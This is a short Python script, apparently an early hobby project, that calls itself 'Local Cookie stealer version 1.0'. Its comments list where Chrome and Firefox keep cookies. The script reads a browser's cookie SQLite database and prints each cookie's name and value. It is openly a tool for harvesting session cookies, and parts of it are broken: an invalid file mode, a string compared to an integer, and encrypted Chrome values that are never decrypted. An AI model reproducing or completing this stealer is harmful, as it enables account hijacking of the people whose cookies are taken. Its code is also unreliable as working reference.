# Imporant shit to know
# Cookies in Chrome - %LocalAppData%\Google\Chrome\User Data\Default\cookies
# Cookies in Firefox - %AppData%\Mozilla\Firefox\Profiles\[Profile]\cookies.sqlite, table: moz_cookies

# TODO: 1. Write SQLite integration
#       2. Write File reading
#       3. Write data formatting

from shutil import which
import sqlite3
import platform
import argparse

browsers = ['chrome', "firefox", "opera", "brave", "msedge"]
cookie_table_names = ['cookies', 'moz_cookies', 'cookies', 'cookies', 'cookies']
os_running = platform.system()

def is_browser_installed(browser):
    if os_running == "Windows":
        browser += ".exe"

    if os_running == "Linux" and browser == "msedge":
        browser = "microsoft-edge"

    return which(browser) is not None    

def read_cookies(file, browser):
    result = []
    if ".sqlite" in file:
        result = read_sqlite_db(file, cookie_table_names[browser])
    else:        
        with open(file, "rw") as cookies:
            result = cookies.read()
    
    return result

       

def read_sqlite_db(file_handler, db_name = "cookies"):
    conn = sqlite3.connect(file_handler)
    cursor = conn.cursor()
    print("[+] Connection Established")

    query = f"SELECT * FROM {db_name}"
    cursor.execute(query)
    result = cursor.fetchall()
    return result


def format_cookies(cookies_list):
    for cookie in cookies_list:
        print(f"[+] Found cookie - {cookie[2]}")
        print(cookie[3])




if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog= "Local Cookie stealer version 1.0",usage="""
        Usage: local-cookie-stealer.py -f [file] -b [Browser ID]
    """,
    epilog="""
        Browser IDs:
        0 - chrome
        1 - firefox
        2 - opera
        3 - brave
        4 - edge
    """
    )
    parser.add_argument("-f", "--file")
    parser.add_argument("-b", "--browser")

    args = parser.parse_args()

    print("Local Cookie stealer version 1.0\n")
    if args.browser != -1:
        if is_browser_installed(browsers[int(args.browser)]):
            print(f"[+] Browser {browsers[int(args.browser)]} is present in a system")
        else:
            print(f"\033[31m[-] Browser {browsers[int(args.browser)]} is absent in a system\033[0m")
        print("[*] Proceeding...")
    
    if args.file:
        cookies = read_cookies(args.file, int(args.browser))
        if not cookies:
            print("\033[31m[-] No cookies found\033[0m")
        else:
            format_cookies(cookies)


